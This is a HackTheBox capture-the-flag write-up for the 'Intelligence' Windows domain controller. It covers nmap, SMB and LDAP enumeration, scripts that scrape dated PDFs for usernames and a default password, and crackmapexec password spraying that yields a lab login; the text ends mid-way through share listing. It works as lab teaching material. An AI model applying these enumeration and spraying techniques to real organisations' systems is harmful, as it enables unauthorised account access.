#### Intelligence (HackTheBox)



# Enumeration
## NMAP
```bash
# Nmap 7.91 scan initiated Sun Jul  4 07:13:25 2021 as: nmap -A -v -T4 -Pn -oN intial.nmap intelligence.htb
Increasing send delay for 10.129.80.199 from 0 to 5 due to 25 out of 61 dropped probes since last increase.
adjust_timeouts2: packet supposedly had rtt of 10052524 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of 10052524 microseconds.  Ignoring time.
Increasing send delay for 10.129.80.199 from 5 to 10 due to 14 out of 34 dropped probes since last increase.
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for intelligence.htb (10.129.80.199)
Host is up (0.57s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-04 13:18:02Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767 9533 67fb d65d 6065 dff7 7ad8 3e88
|_SHA-1: 1555 29d9 fef8 1aec 41b7 dab2 84d7 0f9d 30c7 bde7
|_ssl-date: 2021-07-04T13:19:42+00:00; +6h59m58s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767 9533 67fb d65d 6065 dff7 7ad8 3e88
|_SHA-1: 1555 29d9 fef8 1aec 41b7 dab2 84d7 0f9d 30c7 bde7
|_ssl-date: 2021-07-04T13:19:43+00:00; +6h59m57s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767 9533 67fb d65d 6065 dff7 7ad8 3e88
|_SHA-1: 1555 29d9 fef8 1aec 41b7 dab2 84d7 0f9d 30c7 bde7
|_ssl-date: 2021-07-04T13:19:42+00:00; +6h59m57s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767 9533 67fb d65d 6065 dff7 7ad8 3e88
|_SHA-1: 1555 29d9 fef8 1aec 41b7 dab2 84d7 0f9d 30c7 bde7
|_ssl-date: 2021-07-04T13:19:43+00:00; +6h59m57s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m56s, deviation: 0s, median: 6h59m56s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-07-04T13:19:08
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   825.63 ms 10.10.14.1
2   829.73 ms intelligence.htb (10.129.80.199)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul  4 07:19:47 2021 -- 1 IP address (1 host up) scanned in 383.99 seconds
```
Looks like a normal Active Directory setup for windows OS.
## SMB
### Enum4linux
```bash
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jul  4 07:18:41 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... intelligence.htb
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ======================================================== 
|    Enumerating Workgroup/Domain on intelligence.htb    |
 ======================================================== 
[E] Can't find workgroup/domain


 ================================================ 
|    Nbtstat Information for intelligence.htb    |
 ================================================ 
Looking up status of 10.129.80.199
No reply from 10.129.80.199

 ========================================= 
|    Session Check on intelligence.htb    |
 ========================================= 
[+] Server intelligence.htb allows sessions using username '', password ''
[+] Got domain/workgroup name: 

 =============================================== 
|    Getting domain SID for intelligence.htb    |
 =============================================== 
Domain Name: intelligence
Domain Sid: S-1-5-21-4210132550-3389855604-3437519686
[+] Host is part of a domain (not a workgroup)

 ========================================== 
|    OS information on intelligence.htb    |
 ========================================== 
[+] Got OS info for intelligence.htb from smbclient: 
[+] Got OS info for intelligence.htb from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ================================= 
|    Users on intelligence.htb    |
 ================================= 
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ============================================= 
|    Share Enumeration on intelligence.htb    |
 ============================================= 

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on intelligence.htb

 ======================================================== 
|    Password Policy Information for intelligence.htb    |
 ======================================================== 
[E] Unexpected error from polenum:


[+] Attaching to intelligence.htb using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:INTELLIGENCE.HT)

[+] Trying protocol 445/SMB...

	[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.


[E] Failed to get password policy with rpcclient


 ================================== 
|    Groups on intelligence.htb    |
 ================================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 =========================================================================== 
|    Users on intelligence.htb via RID cycling (RIDS: 500-550,1000-1050)    |
 =========================================================================== 
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

 ================================================= 
|    Getting printer info for intelligence.htb    |
 ================================================= 
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Sun Jul  4 07:19:54 2021
```
Nothing much from here so let's try anonymous login.
### Anonymous Login
```bash
kali@kali:~/HackTheBox/Intelligence$ smbclient -L //intelligence.htb
Enter WORKGROUP\kali's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```
We have anonymous login but we have access to shares so let's enumerate further.
## LDAP
let's do an ldap search for getting naming context for the AD(Active Directory).
```bash
kali@kali:~/HackTheBox/Intelligence$ ldapsearch -x -h intelligence.htb -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=intelligence,DC=htb
namingcontexts: CN=Configuration,DC=intelligence,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=intelligence,DC=htb
namingcontexts: DC=DomainDnsZones,DC=intelligence,DC=htb
namingcontexts: DC=ForestDnsZones,DC=intelligence,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```
Looks like it's normal intelligence.htb so let's move on from there.
## Web
Looking through the webpage we can see we can get two PDF so maybe we can get some username from it's exifdata.
so let's get the two PDF's.
```bash
kali@kali:~/HackTheBox/Intelligence$ wget http://intelligence.htb/documents/2020-01-01-upload.pdf
--2021-07-04 07:32:21--  http://intelligence.htb/documents/2020-01-01-upload.pdf
Resolving intelligence.htb (intelligence.htb)... 10.129.80.199
Connecting to intelligence.htb (intelligence.htb)|10.129.80.199|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 26835 (26K) [application/pdf]
Saving to: ‘2020-01-01-upload.pdf’

2020-01-01-upload.pdf                     100%[===================================================================================>]  26.21K  79.8KB/s    in 0.3s    

2021-07-04 07:32:22 (79.8 KB/s) - ‘2020-01-01-upload.pdf’ saved [26835/26835]

kali@kali:~/HackTheBox/Intelligence$ wget http://intelligence.htb/documents/2020-12-15-upload.pdf
--2021-07-04 07:32:27--  http://intelligence.htb/documents/2020-12-15-upload.pdf
Resolving intelligence.htb (intelligence.htb)... 10.129.80.199
Connecting to intelligence.htb (intelligence.htb)|10.129.80.199|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27242 (27K) [application/pdf]
Saving to: ‘2020-12-15-upload.pdf’

2020-12-15-upload.pdf                     100%[===================================================================================>]  26.60K  90.0KB/s    in 0.3s    

2021-07-04 07:32:27 (90.0 KB/s) - ‘2020-12-15-upload.pdf’ saved [27242/27242]
```
So now let's try and see it's exifdata from that PDF.
```bash
kali@kali:~/HackTheBox/Intelligence$ exiftool 2020-01-01-upload.pdf 
ExifTool Version Number         : 12.09
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 26 kB
File Modification Date/Time     : 2021:04:01 18:00:00+01:00
File Access Date/Time           : 2021:07:04 07:32:22+01:00
File Inode Change Date/Time     : 2021:07:04 07:32:22+01:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee
kali@kali:~/HackTheBox/Intelligence$ exiftool 2020-12-15-upload.pdf 
ExifTool Version Number         : 12.09
File Name                       : 2020-12-15-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2021:04:01 18:00:00+01:00
File Access Date/Time           : 2021:07:04 07:32:27+01:00
File Inode Change Date/Time     : 2021:07:04 07:32:27+01:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams
kali@kali:~/HackTheBox/Intelligence$
```
Looks like we have two usernames Jose.Williams and William.Lee so let's create a wordlist with different combination from their names and then brute it with kerbrute.
## Kerberos
Thinking about the wordlist I came up with this wordlist below.
```bash
Administrator
Guest
William
Jose.Williams 
William.Lee
Jwilliams
JWilliams
WLee
Wlee
LWilliams
Lwilliams
WJose
Wjose
wJose
wjose
lWilliams
lwilliams
wlee
wLee
jWilliams
jwilliams
```
In this case you don't need to create this wordlist cause the author name is one of the usernames but in Real like scenario or the in some difficult CTF you might need to create the wordlist as above.
Let's move on and try kerbrute on the AD.
```bash
kali@kali:~/HackTheBox/Intelligence$ ~/Git/kerbrute/dist/kerbrute userenum --dc intelligence.htb -d intelligence.htb user.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (1ad284a) - 07/04/21 - Ronnie Flathers @ropnop

2021/07/04 07:37:21 >  Using KDC(s):
2021/07/04 07:37:21 >   intelligence.htb:88

2021/07/04 07:37:22 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2021/07/04 07:37:22 >  [+] VALID USERNAME:       Administrator@intelligence.htb
2021/07/04 07:37:22 >  Done! Tested 21 usernames (2 valid) in 0.804 seconds
```
So now we have two users before bruting the password let's try and check for some low hanging fruits like GetNpuser.
Got nothing from that so I though that there could be something else so I went on to check PDF's.
## Web
So I checked the naming of PDF is using the date and then followed by upload. so I tried to brute all the dates to get if there are anymore PDF's.
The below script will create a new PDF directory and download all pdf in that directory.
```python
#!/usr/bin/python3

import requests
import os

url = 'http://intelligence.htb/documents/'

for i in range(2020,2022):
	for j in range(1,13):
		for k in range(1,31):
			date = f'{i}-{j:02}-{k:02}-upload.pdf'
			r = requests.get(url+date)
			#print (r.text)
			if (r.status_code == 200):
				print (date)
				#text = r.text
				os.system('mkdir pdf')
				os.system(f'wget {url}{date} -O pdf/{date}')
```
Now as the nummber of PDF files was more I wrote another python script to extract
the usernames.
```python
#!/usr/bin/python3

from pwn import *

io = process('/bin/sh')
io.sendline('ls -al pdf/')
lst = io.recvrepeat(1).decode().strip().split('\n')
files = []
for i in range(3,len(lst)):
	tmp = lst[i].split(' ')
	files.append(tmp[9])
#print (files)
f = open('users.txt','w')
for i in files:
	io.sendline(f'exiftool pdf/{i}')
	tmp = (io.recvrepeat(1).decode().strip().split(': '))
	f.write(tmp[-1] + '\n')
	print (tmp[-1])

f.close()
```
And it will create users.txt for you.
now after getting users.txt you can retry NPUsers.py but it won't help so let's dig more into PDF.
Now searching for password in pdf I wrote this simple python script to make my job easy.
```python
#!/usr/bin/python3

from pdfminer.high_level import extract_text

files = ['2020-01-01-upload.pdf', '2020-01-02-upload.pdf', '2020-01-04-upload.pdf', '2020-01-10-upload.pdf', '2020-01-20-upload.pdf', '2020-01-22-upload.pdf', '2020-01-23-upload.pdf', '2020-01-25-upload.pdf', '2020-01-30-upload.pdf', '2020-02-11-upload.pdf', '2020-02-17-upload.pdf', '2020-02-23-upload.pdf', '2020-02-24-upload.pdf', '2020-02-28-upload.pdf', '2020-03-04-upload.pdf', '2020-03-05-upload.pdf', '2020-03-12-upload.pdf', '2020-03-13-upload.pdf', '2020-03-17-upload.pdf', '2020-03-21-upload.pdf', '2020-04-02-upload.pdf', '2020-04-04-upload.pdf', '2020-04-15-upload.pdf', '2020-04-23-upload.pdf', '2020-05-01-upload.pdf', '2020-05-03-upload.pdf', '2020-05-07-upload.pdf', '2020-05-11-upload.pdf', '2020-05-17-upload.pdf', '2020-05-20-upload.pdf', '2020-05-21-upload.pdf', '2020-05-24-upload.pdf', '2020-05-29-upload.pdf', '2020-06-02-upload.pdf', '2020-06-03-upload.pdf', '2020-06-04-upload.pdf', '2020-06-07-upload.pdf', '2020-06-08-upload.pdf', '2020-06-12-upload.pdf', '2020-06-14-upload.pdf', '2020-06-15-upload.pdf', '2020-06-21-upload.pdf', '2020-06-22-upload.pdf', '2020-06-25-upload.pdf', '2020-06-26-upload.pdf', '2020-06-28-upload.pdf', '2020-06-30-upload.pdf', '2020-07-02-upload.pdf', '2020-07-06-upload.pdf', '2020-07-08-upload.pdf', '2020-07-20-upload.pdf', '2020-07-24-upload.pdf', '2020-08-01-upload.pdf', '2020-08-03-upload.pdf', '2020-08-09-upload.pdf', '2020-08-19-upload.pdf', '2020-08-20-upload.pdf', '2020-09-02-upload.pdf', '2020-09-04-upload.pdf', '2020-09-05-upload.pdf', '2020-09-06-upload.pdf', '2020-09-11-upload.pdf', '2020-09-13-upload.pdf', '2020-09-16-upload.pdf', '2020-09-22-upload.pdf', '2020-09-27-upload.pdf', '2020-09-29-upload.pdf', '2020-09-30-upload.pdf', '2020-10-05-upload.pdf', '2020-10-19-upload.pdf', '2020-11-01-upload.pdf', '2020-11-03-upload.pdf', '2020-11-06-upload.pdf', '2020-11-10-upload.pdf', '2020-11-11-upload.pdf', '2020-11-13-upload.pdf', '2020-11-24-upload.pdf', '2020-11-30-upload.pdf']
#keywords = ['user','username','pass','password']
keywords = 'user'

for i in files:
	text = extract_text('pdf/'+i)
	if(keywords in text):
		print (i)
		print (text)
```
So this will give you the following output.
```bash
kali@kali:~/HackTheBox/Intelligence$ chmod +x script.py
kali@kali:~/HackTheBox/Intelligence$ ./script.py 
2020-06-04-upload.pdf
New Account Guide

Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876

After logging in please change your password as soon as possible.
```
So now we have default password so let's try and spray that password at our username I tried kerbrute but didn't yeild anything then I tried crackmapexec.
## Crackmapexec
```bash
kali@kali:~/HackTheBox/Intelligence$ crackmapexec smb <MACHINE IP> -u users.txt -p NewIntelligenceCorpUser9876
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[34m[*][0m Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\User9876:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[31m[-][0m intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
[1m[34mSMB[0m         10.129.80.199   445    DC               [1m[32m[+][0m intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 [1m[33m[0m
```
Look like we have password for Tiffany.Molina
## smbmap
```bash
[\] Working on it...
[+] IP: intelligence.htb:445	Name: unknown                                           
[-] Working on it...
                                
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	.\IPC$\*
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	InitShutdown
	fr--r--r--                4 Sun Dec 31 23:58:45 1600	lsass
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	ntsvcs
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	scerpc
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-39c-0
